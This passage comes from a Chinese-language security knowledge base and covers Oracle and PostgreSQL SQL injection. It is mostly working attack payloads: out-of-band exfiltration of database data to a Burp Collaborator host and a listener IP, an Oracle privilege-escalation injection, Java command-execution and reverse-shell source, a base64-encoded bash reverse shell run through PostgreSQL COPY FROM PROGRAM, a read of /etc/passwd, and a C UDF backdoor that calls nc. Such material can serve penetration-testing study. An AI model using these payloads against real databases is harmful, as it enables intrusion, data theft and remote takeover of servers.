dual)) from dual) is not null-- dbms_xdb_version.makeversioned() select dbms_xdb_version.makeversioned((select user from dual)) from dual and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null dbms_xdb_version.uncheckout() select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual -- payload and (select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual) is not null dbms_utility.sqlid_to_sqlhash() SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual and (SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual) is not null ordsys.ord_dicom.getmappingxpath() select ordsys.ord_dicom.getmappingxpath((select banner from v$version where banner like 'Oracle%'),1,1) from dual utl_inaddr.*() 作用:用于取得局域网或Internet环境中的主机名和IP地址. 1、utl_inaddr.get_host_address 如果查询失败，则提示系统错误 select utl_inaddr.get_host_address((select user from dual)) from dual 2、UTL_INADDR.get_host_name 如果查询失败，则提示系统错误 select utl_inaddr.get_host_name((select user from dual)) from dual OOB 外带注入 以下都需要用户可访问网络的权限 utl_http.request() 使用此方法，用户需要有utl_http访问网络的权限 然后使用||拼接字符外带出来，可以远程启动HTTP服务，或者nc远程监听某个端口 and utl_http.request('http://172.17.0.1:8888/'||(select banner from v$version where banner like 'Oracle%'))=1 utl_inaddr.get_host_address() 使用dnslog外带数据 select utl_inaddr.get_host_address((select user from dual)||'.slhiqawh25q5ujl3kqdt0o48pzvqjf.burpcollaborator.net') from dual -- payload and (select utl_inaddr.get_host_address((select user from dual)||'.slhiqawh25q5ujl3kqdt0o48pzvqjf.burpcollaborator.net') from dual) is not null 如果像数据库版本太长，会导致出错，既然要外带，就使用substr()函数来截取字符串，每次取几个特定的字符即可,下图是选择全长度的数据库，会直接报错 这里使用substr函数进行分割，一个一个获取 SYS.DBMS_LDAP.INIT()函数 select SYS.DBMS_LDAP.INIT((select user from dual)||'.slhiqawh25q5ujl3kqdt0o48pzvqjf.burpcollaborator.net',80) from dual HTTPURITYPE() 同样需要python起一个http服务，或者nc创建监听，或者dnslog外带 select HTTPURITYPE('http://172.17.0.1:8888/'||(select user from dual)).GETCLOB() FROM DUAL and (select HTTPURITYPE('http://'||(select user from dual)||'.slhiqawh25q5ujl3kqdt0o48pzvqjf.burpcollaborator.net').GETCLOB() FROM DUAL) is not null 其他攻击方式 Oracle XXE 实际上是CVE-2014-6577，受影响的版本：11.2.0.3，11.2.0.4，12.1.0.1 和12.1.0.2 Oracle XXE 的效果和 UTL_http 的效果差不多，都是将数据传输到远端服务器上。但是，由于 extractvalue() 函数对所有数据库用户都可以使用，不存在权限的问题，所以当在低权限没有UTL_http 权限时，这个不失为一个好方法 select extractvalue(xmltype(' %remote;]>'),'/l') from dual Oracle 提权漏洞 原理是 GET_DOMAIN_INDEX_TABLES 函数的参数存在注入。而该函数的所有者是 sys，所以通过注入就可以执行任意 sql 语句。而该函数的执行权限为 public，所以只要遇到一个 Oracle 的注入点并且存在这个漏洞的，基本上都可以提升到最高权限。 select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES( '1', '1', 'DBMS _OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''your own payload'''';END;'';END;--', 'SYS', 0, '1', 0 ) from dual; 权限提升之后就可以做很多事了，因为 Oracle 可以执行 JAVA 代码，所以在提升权限后具体怎么操作，就看各自的 JAVA 水平了。 这里给出几种常见的利用方式（以下均为 your own payload 处的代码）： 命令执行 创建JAVA代码 create or replace and compile java source named \"Command\" as import java.io.*;public class Command{public static String exec(String cmd) throws Exception{String sb=\"\";BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr = new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr = inBr.readLine()) != null)sb+=lineStr+\"\\n\";inBr.close();in.close();return sb;}} 赋予代码执行权限 begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''>'''''''', ''''''''execute'''''''' );end; 创建函数 create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name ''''''''Command.exec(java.lang.String) return String''''''''; 赋予函数执行权限 grant all on cmd to public 执行命令 select sys.cmd('whoami') from dual; 反弹shell 创建java代码 create or replace and compile java source named \"shell\" as import java.io.*;import java.net.*;public class shell{public static void run() throws Exception {Socket s = new Socket(\"your own ip\", 80);Process p = Runtime.getRuntime().exec(\"cmd.exe\");new T(p.getInputStream(), s.getOutputStream()).start();new T(p.getErrorStream(), s.getOutputStream()).start();new T(s.getInputStream(), p.getOutputStream()).start();}static class T extends Thread {private InputStream i;private OutputStream u;public T(InputStream in, OutputStream out) {this.u = out;this.i = in;}public void run() {BufferedReader n = new BufferedReader(new InputStreamReader(i));BufferedWriter w = new BufferedWriter(new OutputStreamWriter(u));char f[] = new char[8192];int l;try {while ((l = n.read(f, 0, f.length)) > 0) {w.write(f, 0, l);w.flush();}} catch (IOException e) {}try {if (n != null)n.close();if (w != null)w.close();} catch (Exception e) {}}}} 赋予代码执行权限 begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.net.SocketPermission'''''''', ''''''''<>'''''''', ''''''''*'''''''' );end; 创建函数 create or replace function reversetcp RETURN VARCHAR2 as language java name ''''''''shell.run() return String''''''''; 赋予函数执行权限 grant all on reversetcp to public 执行命令 select sys.reversetcp from dual; Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 11:32:39 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/Oracle/Oracle注入基础.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/Postgresql/Postgresql.html":{"url":"知识库/01.WEB安全/01.SQLi/Postgresql/Postgresql.html","title":"Postgresql","keywords":"","body":" 简介 特征 schema(模式) SQL 一些小tips 参考链接 简介 PostgreSQL 是一个免费的对象-关系数据库服务器(ORDBMS)，在灵活的BSD许可证下发行。 PostgreSQL 开发者把它念作 post-gress-Q-L。 PostgreSQL 的 Slogan 是 \"世界上最先进的开源关系型数据库\"。 特征 特征 描述 函数 通过函数，可以在数据库服务器端执行指令程序 索引 用户可以自定义索引方法，或使用内置的 B 树，哈希表与 GiST 索引 触发器 触发器是由SQL语句查询所触发的事件。如：一个INSERT语句可能触发一个检查数据完整性的触发器。触发器通常由INSERT或UPDATE语句触发。 多版本并发控制：PostgreSQL使用多版本并发控制（MVCC，Multiversion concurrency control）系统进行并发控制，该系统向每个用户提供了一个数据库的\"快照\"，用户在事务内所作的每个修改，对于其他的用户都不可见，直到该事务成功提交 规则 规则（RULE）允许一个查询能被重写，通常用来实现对视图（VIEW）的操作，如插入（INSERT）、更新（UPDATE）、删除（DELETE） 数据类型 包括文本、任意精度的数值数组、JSON 数据、枚举类型、XML 数据等 全文检索 通过 Tsearch2 或 OpenFTS，8.3版本中内嵌 Tsearch2。 NoSQL JSON，JSONB，XML，HStore 原生支持，至 NoSQL 数据库的外部数据包装器 数据仓库 能平滑迁移至同属 PostgreSQL 生态的 GreenPlum，DeepGreen，HAWK 等，使用 FDW 进行 ETL schema(模式) 一个PostgreSQL数据库集群包含一个或多个已命名数据库。用户和用户组在整个集群范围内是共享的，但是其它数据并不共享。任何与服务器连接的客户都只能访问那个在连接请求里声明的数据库。 注意: 集群中的用户并不一定要有访问集群内所有数据库的权限。共享用户名的意思是不能有重名用户。假定同一个集群里有两个数据库和一个joe用户，系统可以配置成只允许joe 访问其中的一个数据库。 一个数据库包含一个或多个已命名的模式，模式又包含表。模式还可以包含其它对象，包括数据类型、函数、操作符等。同一个对象名可以在不同的模式里使用而不会导致冲突；比如，schema1和myschema都可以包含一个名为mytable的表。和数据库不同，模式不是严格分离的：只要有权限，一个用户可以访问他所连接的数据库中的任意模式中的对象。 我们需要模式的原因有好多： 允许多个用户使用一个数据库而不会干扰其它用户。 把数据库对象组织成逻辑组，让它们更便于管理。 第三方的应用可以放在不同的模式中，这样它们就不会和其它对象的名字冲突。 模式类似于操作系统层次的目录，只不过模式不能嵌套。 默认的schema是public模式 --简单版目录结构 postgres --public(schema) ----table_name_1 ----table_name_2 --myschema(schema) ----table_name_1 ----table_name_2 --schema... ----table_name_1 ----table_name_2 SQL postgres=# \\help SELECT Command: SELECT Description: retrieve rows from a table or view Syntax: [ WITH [ RECURSIVE ] with_query [, ...] ] SELECT [ ALL | DISTINCT [ ON ( expression [, ...] ) ] ] [ * | expression [ [ AS ] output_name ] [, ...] ] [ FROM from_item [, ...] ] [ WHERE condition ] [ GROUP BY grouping_element [, ...] ] [ HAVING condition [, ...] ] [ WINDOW window_name AS ( window_definition ) [, ...] ] [ { UNION | INTERSECT | EXCEPT } [ ALL | DISTINCT ] select ] [ ORDER BY expression [ ASC | DESC | USING operator ] [ NULLS { FIRST | LAST } ] [, ...] ] [ LIMIT { count | ALL } ] [ OFFSET start [ ROW | ROWS ] ] [ FETCH { FIRST | NEXT } [ count ] { ROW | ROWS } ONLY ] [ FOR { UPDATE | NO KEY UPDATE | SHARE | KEY SHARE } [ OF table_name [, ...] ] [ NOWAIT | SKIP LOCKED ] [...] ] from_item 可以是以下选项之一： [ ONLY ] table_name [ * ] [ [ AS ] alias [ ( column_alias [, ...] ) ] ] 一些小tips postgresql 默认用户是postgres，密码为空，可直接连接数据库，利用CVE-2019-9193触发命令执行 postgresql 默认支持多语句查询，可以使用堆叠查询读写文件，执行命令 postgresql 快速判断的方法有：pg_sleep()函数，pg_tables，pg_database等等 postgresql 注入一般只能在同库中查询，可以跨schema，但是不能跨库查询参考链接 https://xz.aliyun.com/t/8621 https://blog.csdn.net/m0_48520508/article/details/108509371 https://www.runoob.com/postgresql/postgresql-tutorial.html https://blog.csdn.net/wjzholmes/article/details/105651159 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:40:18 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/Postgresql/Postgresql.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/Postgresql/Postgresql常用符号函数语句归类.html":{"url":"知识库/01.WEB安全/01.SQLi/Postgresql/Postgresql常用符号函数语句归类.html","title":"Postgresql常用符号函数语句归类","keywords":"","body":" 常见符号 注释符 常见函数/表达式 字符串函数 转换函数 其他函数/表达式 语句归类 获取数据库版本 获取当前用户 获取所有的数据库 获取当前数据库 获取当前数据库所有schema 获取当前schema的表名 获取当前表的列名 获取当前表的值 常见符号 注释符 符号 说明 -- 单行注释 x为任意字符，这里表示有一个空格 | | /**/ | 多行(内联)注释 | | || | 字符串拼接 | | ::text | 类型转换为text | 常见函数/表达式 字符串函数 函数 描述 string 丨丨 string 字串连接 'Post' 丨丨 'greSQL' => PostgreSQL | | bit_length(string) | 字串里二进制位的个数 bit_length('jose') => 32 | | char_length(string) | 字串中的字符个数 char_length('jose') => 4 | | convert(string using conversion_name) | 使用指定的转换名字改变编码。 convert('PostgreSQL' using iso_8859_1_to_utf8) =>'PostgreSQL' | | lower(string) | 把字串转化为小写 | | octet_length(string) | 字串中的字节数 octet_length('jose') => 4 | | overlay(string placing string from int [for int]) | 替换子字串 overlay('Txxxxas' placing 'hom' from 2 for 4) => Thomas | | position(substring in string) | 返回指定的子字串的位置 position('om' in 'Thomas') =>3 | | substring(string [from int] [for int]) | 抽取子字串 | | substring(string from pattern) | 抽取匹配 POSIX 正则表达式的子字串 | | substring(string from pattern for escape) | 抽取匹配SQL正则表达式的子字串 | | trim([leading丨trailing 丨 both] [characters] from string) | 从字串string的开头/结尾/两边/ 删除只包含characters(默认是一个空白)的最长的字串 | | upper(string) | 把字串转化为大写。 | | ascii(text) | 参数第一个字符的ASCII码 | | btrim(string text [, characters text]) | 从string开头和结尾删除只包含在characters里(默认是空白)的字符的最长字串 | | chr(int) | 给出ASCII码的字符 | | convert(string text, [src_encoding name,] dest_encoding name) | 把字串转换为dest_encoding | | initcap(text) | 把每个单词的第一个字母转为大写，其它的保留小写。单词是一系列字母数字组成的字符，用非字母数字分隔。 | | length(string text) | string中字符的数目 | | lpad(string text, length int [, fill text]) | 通过填充字符fill(默认为空白)，把string填充为长度length。 如果string已经比length长则将其截断(在右边)。 | | ltrim(string text [, characters text]) | 从字串string的开头删除只包含characters(默认是一个空白)的最长的字串。 | | md5(string text) | 计算给出string的MD5散列，以十六进制返回结果。 | | repeat(string text, number int) | 重复string number次。 repeat('Pg', 4) => PgPgPgPg | | replace(string text, from text, to text) | 把字串string里出现地所有子字串from替换成子字串to。 | | rpad(string text, length int [, fill text]) | 通过填充字符fill(默认为空白)，把string填充为长度length。如果string已经比length长则将其截断。 | | rtrim(string text [, character text]) | 从字串string的结尾删除只包含character(默认是个空白)的最长的字 | | split_part(string text, delimiter text, field int) | 根据delimiter分隔string返回生成的第field个子字串(1 Base)。 split_part('abc~@~def~@~ghi', '~@~', 2) => def | | strpos(string, substring) | 声明的子字串的位置。 strpos('high','ig') => 2 | | substr(string, from [, count]) | 抽取子字串。 | | to_hex(number int/bigint) | 把number转换成其对应地十六进制表现形式。 | | translate(string text, from text, to text) | 把在string中包含的任何匹配from中的字符的字符转化为对应的在to中的字符。 translate('12345', '14', 'ax') => a23x5 | 转换函数 函数 描述 to_char(timestamp, text) 将时间戳转换为字符串 to_char(interval, text) 将时间间隔转换为字符串 to_char(int, text) 整型转换为字符串 to_char(double precision, text) 双精度转换为字符串 to_char(numeric, text) 数字转换为字符串 to_date(text, text) 字符串转换为日期 to_number(text, text) 转换字符串为数字 to_timestamp(text, text) 转换为指定的时间格式 time zone convert string to time stamp to_timestamp(double precision) 把UNIX纪元转换成时间戳 其他函数/表达式 表达式 说明 case...when(expr) then result1 else result2 end 同if 表达式 语句归类 获取数据库版本 select version() 获取当前用户 select user; 获取所有的数据库 select datname from pg_database; 获取当前数据库 select current_database(); 获取当前数据库所有schema select schemaname from pg_tables 获取当前schema的表名 select tablename from pg_tables where schemaname = 'public' -- 或者从该库的information_schema.tables获取 select table_name from information_schema.tables where table_schema='public' 获取当前表的列名 SELECT attname FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='products' AND nspname='public'; select column_name from information_schema.columns where table_name = 'products'; 获取当前表的值 select name from products Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:40:18 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/Postgresql/Postgresql常用符号函数语句归类.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/Postgresql/Postgresql注入基础.html":{"url":"知识库/01.WEB安全/01.SQLi/Postgresql/Postgresql注入基础.html","title":"Postgresql注入基础","keywords":"","body":" 联合查询注入 注入流程 确定字段数量 确定页面回显位 查询数据 盲注 布尔盲注 布尔盲注流程 布尔盲注判断注入点 布尔盲注常用函数 布尔盲注手法 时间盲注 常用函数/表达式 堆叠查询判断数据库 时间盲注示例 报错注入 CAST ::运算符 堆叠注入 Order by 注入 二次注入 HTTP头部注入 文件读/写 读 写 命令执行 低版本的命令执行 高版本的命令执行 CVE-2019-9193 其他 环境 版本 服务器 Linux 数据库 PostgreSQL 11.13 (Debian 11.13-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit web https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text docker postgres:latest PostgreSQL 13.4 环境依然选择使用docker搭建postgresql，web使用burp的靶场来对三大注入方式(联合查询，盲注，报错注入)来进行讲解，在练习postgresql注入的同时，也需要本地环境，这里我使用官方提供的镜像来配合练习SQL语句，如果大家有更好的姿势，欢迎各位讨论 联合查询注入 联合查询注入，和其他关系型数据库一致，需要存在注入的页面有明显的回显位，只是改变一些语法或者sql语句；其作用就是，在原来的查询的条件的基础上，通过关键字union,union all，从而拼接恶意SQL语句，将union后面的select 得到的结果将拼接到前个select的结果的后面 若回显仅支持一行数据的话，让union前边正常的查询语句返回的结果为空 使用union select进行拼接时，注意前后两个select语句的返回的字段数必须相同，否则无法拼接 union,union all区别： union: 对两个结果集进行并集操作，不包括重复行，同时进行默认规则的排序 union all: 对两个结果集进行并集操作，包括重复行，不进行排序；注入流程 这里以burp官方提供的靶场为例，在判断出注入点之后，注入流程如下： ```sql 确定字段的数量 确定页面回显位 利用已知回显位查询数据 a.查询数据库基本信息 b.爆库名 c.爆表名 d.爆字段 e.查询敏感信息 #### 确定字段数量 使用`order by`语句，通过拼接数字，可确定字段数量，若大于，则页面错误/无内容，若小于/等于，则页面正常，若错误页面与正确页面一致，更换盲注或报错注入。 ```sql select * from table_name from column_name = 'xxx' order by 3 正常页面 错误页面 所以这里确定该表字段数为3 确定页面回显位 在这里知道了字段数为3，那么就要判断回显位了，使用union select '1','2','3'将定义的数字显示在页面上，就可以判断页面的回显位了 注意： 若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，我们让前边的select查询条件返回结果为空即可 注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条select语句的方法之一 如果union前面的查询条件返回为空的情况下，也没有标记数字，这时候一般是类型出错，导致无法显示在页面，可以将数字更改未null，如下所示 查询数据 通过前面2步，确定了字段数量以及页面回显位，首先就需要探测相关环境，如下所示： 探测版本 select version(); 探测当前用户 select user; 探测数据库/模式相关 -- 获取当前数据库 select current_database(); -- 获取当前数据库模式/也就是存表的地方 select current_schema; -- 获取所有的数据库 select datname from pg_database; -- 获取当前数据库下所有的模式 select distinct schemaname from pg_tables; -- string_agg(字段,分隔符) 实现group_concat select string_agg(datname,',') from pg_database; -- array_to_string(array_agg(字段，分隔符)) select array_to_string(array_agg(datname),',') from pg_database; 获取当前数据库public模式下的表名 select tablename from pg_tables where schemaname = 'public' -- 或者从该库的information_schema.tables获取 select table_name from information_schema.tables where table_schema='public' 获取products表里的列名 SELECT attname FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='products' AND nspname='public'; select column_name from information_schema.columns where table_name = 'products'; 获取值 select name from products 盲注 布尔盲注 postgresql 布尔盲注和其他数据库盲注一样，通过页面对带入数据库永真/假条件返回的内容差异，从而判断是否可以进行布尔盲注。通常页面返回存在/不存在两个结果，就可以判断是否存在布尔注入了。 布尔盲注流程 1. 判断注入点 2. 求解数据库 a. 判断用户/当前数据库长度 b. 依次求解用户/当前数据库长度 3. 求当前数据库表 a. 判断当前数据库表的个数 b. 猜解第一个表的长度 c. 猜解表的字符串/ascii码值 d. 依次求解，直到找到所有的表 4. 求某表的列名 a. 判断该表列名的个数 b. 猜解第一个列名的长度 c. 猜解第一个列名的字符串/ascii码值 d. 依次求解，直到该表中找到所有的列名 5. 求某表的值 a. 判断字段的个数 b. 猜解第一个字段的长度 c. 猜解第一个字段的字符串/ascii码值 d. 依次求解，直到查询完表中所有的值 布尔盲注判断注入点 and 1=1 恒真 and 1=2 恒假 利用这一特性，我们可以构造payload 通过来页面显示情况来获取数据库数据 布尔盲注常用函数 ascii() substring()/substr() length()布尔盲注手法 获取当前数据库的用户名 ascii('p') = 112select * from xxx_table where xxx = 'xxx' and ascii(substring((select user),1,1)) = 112 依次对字符串求解，当截取到最后一位（+1）时会substring/substr()函数会返回空字符串，ascii对空处理会变成0 所以当第9位为0成立，那么字符串长度为9-1=8位 获取所有的数据库/模式--postgresql limit用法只能使用limit xx offset xx select datname from pg_database limit 1 offset 0; 判断数据库个数select * from xxx_table where xxx = 'xxx' and 3=(select count(datname) from pg_database limit 1 offset 0) 判断第一个数据库名的长度 select * from xxx_table where xxx = 'xxx' and (select length(datname) from pg_database limit 1 offset 0) = 8 判断第一个数据库的字符 select * from xxx_table where xxx = 'xxx' and ascii(substring((select datname from pg_database limit 1 offset 0),1,1)) = 112 依次猜解，可获取库/模式的名称，limit 语法固定使用limit xxx offset xxx来写 获取当前数据库的表 当前数据库为postgres，schema为public -- 首先获取当前数据库、模式下存在多少表 select count(tablename) from pg_tables where schemaname = 'public' select count(table_name) from information_schema.tables where table_schema='public' -- 然后获取当前数据库，模式下某表的长度 select length(tablename) from pg_tables where schemaname = 'public' limit 1 offset 0 select length(table_name) from information_schema.tables where table_schema='public' limit 1 offset 0 -- 猜解表名 select ascii(substring(tablename,1,1)) from pg_tables where schemaname = 'public' limit 1 offset 0 select ascii(substring(table_name,1,1)) from information_schema.tables where table_schema = 'public' limit 1 offset 0 获取当前表的字段名 -- 首先获取当前字段的个数 SELECT count(attname) FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='products' AND nspname='public'; select count(column_name) from information_schema.columns where table_name = 'products'; -- 获取列名长度 SELECT length(attname) FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='products' AND nspname='public' limit 1 offset 0 select length(column_name) from information_schema.columns where table_name = 'products' limit 1 offset 0; -- 获取列名值 SELECT ascii(substr(attname,1,1)) FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='products' AND nspname='public' limit 1 offset 0; select ascii(substr(column_name,1,1)) from information_schema.columns where table_name = 'products' limit 1 offset 0; 获取值 select count(id) from products; select length(name) from products limit 1 offset 0; select ascii(substr(name),1,1) from products limit 1 offset 0; 时间盲注 常用函数/表达式 pg_sleep() case when(expr1) then result1 else result2 end pg_sleep_for(interval) -- 9.4及之后版本新增 select pg_sleep_for('5 sec') pg_sleep_until(timestamp with time zone) ```sql -- 9.4及之后版本新增 postgres=# select now(); 2021-10-08 10:23:54.427797+00 postgres=# select pg_sleep_until('2021-10-08 10:25:20'); postgres=# postgresql 时间盲注和其他数据库时间盲注类似，由于postgresql默认支持堆叠查询，首先在判断数据库时可以利用postgresql特有的pg_sleep()函数来快速判断是否是postgresql #### 堆叠查询判断数据库 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_12_E5mrOzFK.png) #### 时间盲注示例 同布尔盲注流程一致，在case...when...then...else...end表达式内构造条件判断语句，如果正确执行pg_sleep(),否则不做任何操作，通过延时来获取数据 ```sql select case when(ascii(substr((select datname from pg_database limit 1 offset 0),1,1))>97) then (select 1 from pg_sleep(5)) else 1 end when中的表达式主要用于判断True或者False，同布尔盲注的判断条件 报错注入 由于没有找到免费的在线环境，在这里我使用node.js+express快速搭建了一个web靶场，用于测试postgresql的报错注入，环境依赖node.js+postgresql，报错注入在postgresql其实不太常见，由于postgresql默认支持堆叠查询，所以通常使用堆叠查询就直接getshell了 # 拉取postgresql 官方镜像 sudo docker pull postgres sudo docker run -p 5432:5432 --name postgres -e POSTGRES_PASSWORD=123456 -d postgres # node 启动web node app.js 相关代码如下： const express = require('express') const app = new express app.get('/errorbase', (req, res) => { const obj = { data: [], sql: '' } try { const pg = require('pg') var config = { host:'192.168.93.131', user: 'postgres', database: 'postgres', password: '', port: 5432 } const pool = new pg.Pool(config) let id = req.query.id let sql = `select * from users where id = '${id}'` obj.sql = sql pool.connect((err, result) => { }) pool.query(sql, (err, result) => { try { if (err) { throw new Error(err) } else { obj.data = result.rows res.send(obj) } } catch (e) { obj.data = ''+e res.send(obj) } }) } catch (e) { console.log(e) } }) app.listen(8080,() => { console.log('running!') }) 结果如下： CAST 原理：类型转化报错 payload AND 1=CAST((SELECT version()) AS int) 获取数据库版本 select * from users where id = '1' and cast((select version()) as int)=1 获取数据库用户 select * from users where id = '1' and cast((select user) as int)=1 获取数据库/模式 select * from users where id = '1' and cast((SELECT string_agg(datname,',')from pg_database) as int)=1 select * from users where id = '1' and cast((SELECT string_agg(distinct schemaname,',')from pg_tables) as int)=1 获取当前数据库下public的表 select * from users where id = '1' and cast((SELECT string_agg(tablename,',') from pg_tables where schemaname='public') as int)=1 获取users表的列名 select * from users where id = '1' and cast((SELECT string_agg(column_name,',') from information_schema.columns where table_name='users') as int)=1 获取值 select * from users where id = '1' AND 7778=CAST((SELECT string_agg(username,',') from users)::text AS NUMERIC) ::运算符 原理：用于值或字段之后，效果同 cast，但在语法上简便许多，在需要进行多次转换进行报错的时候无疑是很方便的 select '1'::text::int 获取当前用户 select * from users where id = '1' and (select user::int)=1 通过报错注入获取其他数据同cast方式一样，修改核心查询语句即可 堆叠注入 postgresql和mssql一样，默认支持多语句，闭合前语句，再使用;分隔前后的语句，以达到堆叠查询的目的。 由于堆叠查询的特殊性，也可以利用postgresql的特殊函数pg_sleep()快速判断是否是postgresql payload ?id=1';select pg_sleep(5)-- 在判断出注入点以及是postgresql且可堆叠查询的情况下，可以使用CVE-2019-9193，执行任意命令，反弹shell，从版本9.3开始，Postgres新增了一个“COPY TO/FROM PROGRAM”功能。这个功能简单来说就是允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令 --完整sql语句 DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); -- YmFzaCAtaSA+IC9kZXYvdGNwLzE5Mi4xNjguOTMuMTMxLzg4ODggMD4mMQ== 是 bash -i ./dev/tcp/192.168.93.131/8888 0>&1 COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtaSA+IC9kZXYvdGNwLzE5Mi4xNjguOTMuMTMxLzg4ODggMD4mMQ==|base64 -d|bash'; -- 反弹shell这一步可以不用 select * from cmd_exec; 在web中由于+号会被认为是空格，就会导致字符串被拆解，无法利用，需要对+号进行一次url编码，完整payload如下 ?id=1';DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtaSA%2bIC9kZXYvdGNwLzE5Mi4xNjguOTMuMTMxLzg4ODggMD4mMQ==|base64 -d|bash';-- Order by 注入 order by 注入通常出现在排序中，前端展示的表格，某一列需要进行升序或者降序排列，或者做排名比较的时候常常会用到order by排序，order by在select语句中，紧跟在where [where condition]后，且order by 注入无法使用预编译来防御，由于order by 后面需要紧跟column_name，而预编译是参数化字符串，而order by后面紧跟字符串就会提示语法错误，通常防御order by 注入需要使用白名单的方式。 通过order by 列名，根据排序返回的情况来判断是否存在，或者使用超大数，构成SQL语句错误 这里我对代码中的sql语句修改一下，如下所示： let sort = req.query.sort if (sort === undefined) { sort = 'id' } let sql = `select * from users order by ${sort}` postgresql 的order by 注入，涉及条件相当复杂，由于postgresql order by 后面要紧跟true，或者false，需要使用case...when...then...else...end表达式嵌套SELECT和CASE WHEN语句，直到可以将\"布尔盲注成功利用，然后睡眠5秒\"转换为\"true或false\" select case when((select case when(select user = 'postgres') then (select true from PG_SLEEP(5)) else false end)) then true else false end select case when(select user = 'postgres') then (select 1 from pg_sleep(2)) else 1 end 如果开启了报错回显，那么可以利用报错注入获取信息 二次注入 场景见MySQL注入基础二次注入 HTTP头部注入 见MySQL注入基础HTTP头部注入 文件读/写 文件读写在postgresql中比较方便利用，网上有一些函数( pg_logdir_ls()、pg_ls_dir()、pg_file_rename()、pg_file_write()、 pg_read_file()、pg_length_file())读取/写入，但是又有限制，有的函数也没有，所以以下的方法是肯定能利用的 读 创建数据表将读到的文件copy入表 drop table if exists test; CREATE TABLE test(t TEXT); COPY test FROM '/etc/passwd'; SELECT * FROM test limit; 写 copy 命令写入 COPY (select '') to '/tmp/1.php'; 命令执行 以下是摘抄自渗透中利用postgresql getshell的，暂未复现 低版本的命令执行 可以直接调用/lib/libc.so.6或者是/lib64/libc.so.6 一般8.2以下的版本可以 CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE C STRICT; CREATE FUNCTION system(cstring) RcETURNS int AS '/lib64/libc.so.6', 'system' LANGUAGE C STRICT; 直接可以执行 select system('id'); 高版本的命令执行 CVE-2019-9193 见堆叠注入 其他 当postgresql版本高于8.2存在安全机制无法调用系统libc.so.6所以需要自己利用UDF进行命令执行 ERROR: incompatible library \"xxx.so\": missing magic block HINT: Extension libraries are required to use the PG_MODULE_MAGIC macro 第一步可以先查看postgresql支持的扩展语言: select * from pg_language; 如果支持python perl就很简单和低版本一样直接创建调用详情可参考以下文章: http://static.hx99.net/static/drops/tips-6449.html 当不存在其他扩展语言时,postgresql默认支持C,所以要自己传一个编译好的so库去创建可执行命令函数.这里可以使用简短的反弹shell后门 编译反弹shell后门 #include \"postgres.h\" #include \"fmgr.h\" #include #ifdef PG_MODULE_MAGIC PG_MODULE_MAGIC; #endif text *exec() { system(\"nc -./bin/bash vpsIPaddress 2333\"); } 编译环境需要在/usr/pgsql-9.6/include/server/目录下执行应为存在postgres.h头部调用的库 gcc hack.c -I`pg_config --includedir-server` -fPIC -shared -o udf.so strip -sx udf.so #缩减so文件大小 将文件hex后去除\\n cat udf.so | xxd -ps | tr -d \"\\n\" 接下来我们需要将udf.so文件分割成每2048字节的块,最后一个块的大小不满足2048字节不需要考虑. 为什么不能小于2048?是因为在postgresql高版本处理中,如果块之间小于2048,默认会用0去填充让块达到2048字节所以上传的文件才会一直创建函数失败. 